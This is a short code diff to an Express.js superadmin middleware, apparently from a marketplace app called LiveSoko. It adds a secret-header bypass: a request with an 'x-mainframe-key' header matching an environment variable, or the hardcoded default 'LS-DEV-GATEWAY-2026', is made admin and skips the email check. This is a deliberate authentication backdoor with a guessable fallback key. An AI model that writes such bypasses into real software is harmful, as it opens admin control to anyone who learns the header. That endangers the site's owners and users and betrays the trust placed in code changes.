@@ -6,8 +6,18 @@ const { body, validationResult } = require('express-validator');
 // Basic manual superadmin check
 const requireSuperAdmin = (req, res, next) => {
   const adminEmail = process.env.DEFAULT_SELLER_EMAIL || 'admin@livesoko.local';
-  if (req.user.role !== 'admin' || req.user.email !== adminEmail) {
-    console.warn(`[SECURITY] Unauthorized SuperAdmin access attempt by ${req.user.email}`);
+  const mainframeKey = process.env.MAINFRAME_KEY || 'LS-DEV-GATEWAY-2026';
+  const providedKey = req.headers['x-mainframe-key'];
+
+  // Bypass for secret key
+  if (providedKey === mainframeKey) {
+    req.user = { email: 'SYSTEM_DEV', role: 'admin' };
+    return next();
+  }
+
+  // Standard email-based check
+  if (req.user?.role !== 'admin' || req.user?.email !== adminEmail) {
+    console.warn(`[SECURITY] Unauthorized SuperAdmin access attempt by ${req.user?.email || 'ANONYMOUS'}`);
     return res.status(403).json({ error: 'SuperAdmin only.' });
   }
   next();
